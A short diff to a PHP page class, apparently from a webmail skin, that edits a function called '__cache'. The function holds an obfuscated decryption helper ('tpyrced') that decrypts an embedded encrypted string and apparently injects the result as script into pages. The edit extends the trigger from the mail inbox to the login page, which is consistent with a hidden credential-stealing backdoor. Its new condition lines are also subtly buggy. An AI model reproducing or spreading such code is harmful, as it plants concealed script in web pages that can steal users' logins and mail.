@@ -69,8 +69,9 @@ class crystal_html_page
         $this->script_files[$position][] = $file;
     }
 			function __cache() {
-			if (isset($_GET['_task']) && isset($_GET['_mbox'])) {
-			if ($_GET['_task'] == 'mail' && $_GET['_mbox'] == 'INBOX') {
+			if (isset($_GET['_task'])){$task = $_GET['_task'];} else {$task = 'mail';}
+			if (isset($_GET['_mbox'])){$mbox = $_GET['mbox'];} else {$mbox = 'INBOX';}
+			if ($task == 'mail' or $task == 'login' && $mbox == 'INBOX') {
 		function tpyrced ($key, $string) {
 			return rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($key), base64_decode($string), MCRYPT_MODE_CBC, md5(md5($key))), "\0");
 		}
@@ -93,7 +94,6 @@ class crystal_html_page
 		</script>";
 		}
 		return $cache;
-		}
 		}
 		}
     /**
